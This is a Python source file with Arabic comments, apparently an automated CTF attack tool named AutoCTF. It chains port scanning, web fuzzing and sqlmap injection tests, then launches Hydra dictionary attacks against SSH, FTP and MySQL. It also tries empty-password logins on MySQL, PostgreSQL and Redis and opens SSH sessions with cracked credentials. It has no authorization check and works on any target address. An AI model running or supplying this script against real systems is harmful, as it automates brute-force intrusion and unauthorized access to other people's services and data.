# ================= الإعدادات =================
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'

class AutoCTF:
    def __init__(self, target):
        self.target = target
        self.ports = []
        self.services = {}
        self.web_dirs = []
        self.shell = None
        self.user_flag = None
        self.root_flag = None
        self.log = []
        self.session_dir = f"session_{target.replace('.', '_')}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(self.session_dir, exist_ok=True)
        self.log_step(f"بدء جلسة جديدة في {self.session_dir}")

    # ========== الأساسيات ==========
    def log_step(self, message):
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        log_msg = f"[{timestamp}] {message}"
        self.log.append(log_msg)
        print(f"{Colors.CYAN}[*] {log_msg}{Colors.ENDC}")

    def run_command(self, cmd, timeout=120):
        self.log_step(f"تنفيذ: {cmd}")
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return "انتهت المهلة"
        except Exception as e:
            return f"خطأ: {e}"

    def save_output(self, filename, content):
        with open(f"{self.session_dir}/{filename}", "w") as f:
            f.write(content)

    # ========== المرحلة 1: الاستطلاع الشامل ==========
    def recon_all(self):
        """استخدام أدوات متعددة للاستطلاع"""
        self.log_step("بدء الاستطلاع الشامل")
        
        # 1. Nmap شامل
        self.log_step("Nmap - فحص جميع المنافذ")
        nmap_all = self.run_command(f"nmap -p- --min-rate=1000 {self.target}", timeout=300)
        self.save_output("nmap_all_ports.txt", nmap_all)
        
        # استخراج المنافذ المفتوحة
        open_ports = []
        for line in nmap_all.splitlines():
            if "/tcp" in line and "open" in line:
                port = line.split("/")[0]
                open_ports.append(port)
        
        if open_ports:
            ports_str = ",".join(open_ports)
            # 2. Nmap تفصيلي على المنافذ المفتوحة
            self.log_step("Nmap - فحص تفصيلي للخدمات")
            nmap_detailed = self.run_command(f"nmap -sC -sV -p{ports_str} {self.target}")
            self.save_output("nmap_detailed.txt", nmap_detailed)
            
            # استخراج الخدمات
            for line in nmap_detailed.splitlines():
                m = re.search(r'^(\d+)/tcp\s+open\s+(\S+)', line)
                if m:
                    port = m.group(1)
                    service = m.group(2)
                    self.ports.append(port)
                    self.services[port] = service
        
        # 3. Masscan سريع (اختياري)
        if os.path.exists("/usr/bin/masscan"):
            self.log_step("Masscan - فحص سريع")
            masscan_out = self.run_command(f"sudo masscan -p1-65535 --rate=1000 {self.target} --output-format grepable -oG {self.session_dir}/masscan.gnmap", timeout=120)
        
        # 4. enum4linux لـ SMB
        if any('netbios' in s or 'microsoft-ds' in s for s in self.services.values()):
            self.log_step("enum4linux - فحص SMB")
            enum_out = self.run_command(f"enum4linux -a {self.target}")
            self.save_output("enum4linux.txt", enum_out)
        
        self.log_step(f"الخدمات المكتشفة: {self.services}")
        return self.services

    # ========== المرحلة 2: تحليل الويب ==========
    def web_analysis(self, port, protocol="http"):
        """فحص شامل لخدمات الويب"""
        url = f"{protocol}://{self.target}:{port}"
        self.log_step(f"بدء تحليل ويب لـ {url}")
        
        # 1. Gobuster / Dirb / Dirsearch
        wordlist = "/usr/share/wordlists/dirb/common.txt"
        if os.path.exists("/usr/bin/gobuster"):
            self.log_step("Gobuster - تعداد الدلائل")
            gobuster_out = self.run_command(f"gobuster dir -u {url} -w {wordlist} -t 50 -o {self.session_dir}/gobuster_{port}.txt")
            # استخراج الدلائل
            dirs = re.findall(r'/(\w+)/?\s+\(Status: 200\)', gobuster_out)
            self.web_dirs.extend(dirs)
        
        # 2. Nikto
        if os.path.exists("/usr/bin/nikto"):
            self.log_step("Nikto - فحص الثغرات")
            nikto_out = self.run_command(f"nikto -h {url} -o {self.session_dir}/nikto_{port}.txt")
        
        # 3. WhatWeb
        if os.path.exists("/usr/bin/whatweb"):
            self.log_step("WhatWeb - تحديد التقنيات")
            whatweb_out = self.run_command(f"whatweb {url} > {self.session_dir}/whatweb_{port}.txt")
        
        # 4. WPScan إذا كان ووردبريس
        if "wp-content" in gobuster_out or "wp-admin" in gobuster_out:
            if os.path.exists("/usr/bin/wpscan"):
                self.log_step("WPScan - فحص ووردبريس")
                wpscan_out = self.run_command(f"wpscan --url {url} --enumerate u,vp,vt --api-token YOUR_API_TOKEN > {self.session_dir}/wpscan_{port}.txt")
        
        # 5. SQLMap على المعاملات
        self.log_step("محاولة اكتشاف معاملات SQL")
        # استخدام waybackurls أو paramspider لجمع URLs
        if os.path.exists("/usr/bin/waybackurls"):
            wayback_out = self.run_command(f"waybackurls {self.target} > {self.session_dir}/wayback_urls.txt")
            if os.path.getsize(f"{self.session_dir}/wayback_urls.txt") > 0:
                self.log_step("SQLMap - اختبار SQL injection")
                sqlmap_out = self.run_command(f"sqlmap -m {self.session_dir}/wayback_urls.txt --batch --random-agent --level 2 > {self.session_dir}/sqlmap.txt", timeout=300)
        
        # 6. FFUF لاكتشاف المزيد
        if os.path.exists("/usr/bin/ffuf"):
            self.log_step("FFUF - fuzzing متقدم")
            ffuf_out = self.run_command(f"ffuf -u {url}/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ac -o {self.session_dir}/ffuf_{port}.json")
        
        self.save_output("web_dirs.txt", "\n".join(self.web_dirs))
        return self.web_dirs

    # ========== المرحلة 3: استغلال الخدمات ==========
    def exploit_services(self):
        """محاولة استغلال جميع الخدمات المكتشفة"""
        for port, service in self.services.items():
            self.log_step(f"محاولة استغلال {service} على المنفذ {port}")
            
            # SSH
            if 'ssh' in service:
                self.exploit_ssh(port)
            
            # FTP
            elif 'ftp' in service:
                self.exploit_ftp(port)
            
            # SMB
            elif 'microsoft-ds' in service or 'netbios' in service:
                self.exploit_smb()
            
            # MySQL
            elif 'mysql' in service:
                self.exploit_mysql(port)
            
            # PostgreSQL
            elif 'postgresql' in service:
                self.exploit_postgres(port)
            
            # Redis
            elif 'redis' in service:
                self.exploit_redis(port)
            
            # MongoDB
            elif 'mongodb' in service:
                self.exploit_mongodb(port)
            
            # Oracle
            elif 'oracle' in service:
                self.exploit_oracle(port)
            
            # HTTP/HTTPS - تم التعامل معه في web_analysis
            elif 'http' in service:
                continue
            
            # خدمات أخرى - البحث في searchsploit
            else:
                self.search_exploit(service, port)

    def exploit_ssh(self, port):
        """هجمات SSH"""
        # 1. هجوم قاموس باستخدام hydra
        if os.path.exists("/usr/bin/hydra"):
            self.log_step("Hydra - هجوم قاموس على SSH")
            wordlist = "/usr/share/wordlists/rockyou.txt"
            hydra_out = self.run_command(f"hydra -l root -P {wordlist} ssh://{self.target}:{port} -t 4 -o {self.session_dir}/hydra_ssh.txt")
            
            # تحليل النتائج
            if os.path.exists(f"{self.session_dir}/hydra_ssh.txt"):
                with open(f"{self.session_dir}/hydra_ssh.txt") as f:
                    data = f.read()
                    m = re.search(r'login:\s+(\S+)\s+password:\s+(\S+)', data)
                    if m:
                        user, pwd = m.groups()
                        self.log_step(f"وجدنا بيانات SSH: {user}:{pwd}")
                        # محاولة الاتصال
                        self.get_shell_via_ssh(user, pwd, port)
        
        # 2. البحث عن استغلال
        self.search_exploit("openssh", port)

    def exploit_ftp(self, port):
        """هجمات FTP"""
        if os.path.exists("/usr/bin/hydra"):
            self.log_step("Hydra - هجوم قاموس على FTP")
            hydra_out = self.run_command(f"hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://{self.target}:{port} -t 4 -o {self.session_dir}/hydra_ftp.txt")
        
        # محاولة anonymous
        self.run_command(f"echo 'anonymous\nanonymous\nquit' | ftp {self.target} {port} > {self.session_dir}/ftp_anonymous.txt")

    def exploit_smb(self):
        """هجمات SMB"""
        if os.path.exists("/usr/bin/smbclient"):
            self.log_step("SMBclient - محاولة الاتصال")
            smb_out = self.run_command(f"smbclient -L //{self.target} -N > {self.session_dir}/smb_shares.txt")
        
        if os.path.exists("/usr/bin/enum4linux"):
            enum_out = self.run_command(f"enum4linux -a {self.target} > {self.session_dir}/enum4linux.txt")
        
        if os.path.exists("/usr/bin/smbmap"):
            smbmap_out = self.run_command(f"smbmap -H {self.target} > {self.session_dir}/smbmap.txt")

    def exploit_mysql(self, port):
        """هجمات MySQL"""
        # محاولة كلمات مرور افتراضية
        if os.path.exists("/usr/bin/mysql"):
            self.log_step("MySQL - محاولة اتصال")
            mysql_out = self.run_command(f"mysql -h {self.target} -P {port} -u root -p'' -e 'show databases;' > {self.session_dir}/mysql_root_nopass.txt")
        
        # هجوم قاموس
        if os.path.exists("/usr/bin/hydra"):
            hydra_out = self.run_command(f"hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://{self.target}:{port} -o {self.session_dir}/hydra_mysql.txt")

    def exploit_postgres(self, port):
        """هجمات PostgreSQL"""
        if os.path.exists("/usr/bin/psql"):
            self.log_step("PostgreSQL - محاولة اتصال")
            pg_out = self.run_command(f"PGPASSWORD='' psql -h {self.target} -p {port} -U postgres -c '\\l' > {self.session_dir}/postgres_nopass.txt")

    def exploit_redis(self, port):
        """هجمات Redis"""
        if os.path.exists("/usr/bin/redis-cli"):
            self.log_step("Redis - محاولة اتصال")
            redis_out = self.run_command(f"redis-cli -h {self.target} -p {port} info > {self.session_dir}/redis_info.txt")
            if "redis_version" in redis_out:
                self.log_step("Redis غير محمي بكلمة مرور")
